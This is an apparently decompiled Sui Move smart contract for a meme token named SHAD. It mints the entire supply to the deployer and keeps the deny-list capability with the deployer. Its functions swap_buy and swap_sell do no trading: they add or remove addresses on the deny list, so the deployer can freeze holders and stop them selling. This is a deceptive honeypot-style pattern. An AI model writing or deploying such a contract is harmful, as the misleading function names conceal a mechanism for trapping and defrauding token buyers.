module 0xc57d1e25b5be29e2c34f3494ccfd199b977d7874294c082185da28a00e7bd2a5::shad {
    struct SHAD has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SHAD, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SHAD>(arg0, 9, b"SHAD", b"Shadilay The Original PEPE", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmZCEToZeFnem2qu3dxSCs2WkJdtz6MUNZzK2LYnzRjB4x"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SHAD>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SHAD>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SHAD>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SHAD>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SHAD>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SHAD>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SHAD>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SHAD>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

